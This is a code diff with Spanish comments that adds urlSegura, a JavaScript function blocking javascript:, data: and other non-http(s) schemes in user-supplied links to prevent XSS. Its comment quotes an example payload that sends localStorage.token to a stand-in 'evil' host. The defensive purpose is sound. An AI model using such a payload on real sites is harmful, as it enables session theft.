@@ -17,6 +17,23 @@ function escAttr(s) {
 window.esc = esc;
 window.escAttr = escAttr;
 
+// ── URL SEGURA (XSS por href) ─────────────────────────────────
+// esc()/escAttr() escapan metacaracteres HTML pero NO el ESQUEMA de una URL: un
+// href="javascript:fetch('//evil/'+localStorage.token)" pasa intacto y roba la sesión
+// al hacer clic. Todo href que venga de datos cargados por usuarios pasa por acá.
+// Devuelve una URL http(s) segura, o "" si el esquema no es seguro (el llamador
+// muestra el texto sin link).
+function urlSegura(u) {
+    const s = String(u == null ? "" : u).trim();
+    if (!s) return "";
+    if (/^https?:\/\//i.test(s)) return s;
+    // Tiene un esquema y no es http(s) → javascript:, data:, vbscript:, file:… → fuera.
+    if (/^[a-z][a-z0-9+.-]*:/i.test(s)) return "";
+    // Sin esquema (ej. "www.pagina.com"): asumimos https.
+    return "https://" + s;
+}
+window.urlSegura = urlSegura;
+
 // ── DISPLAY NAME ──────────────────────────────────────────────
 // El programa nombra a las personas por "Nombre Apellido" (campo `nombre_display`
 // que devuelve el backend); el username queda como credencial corta de login.
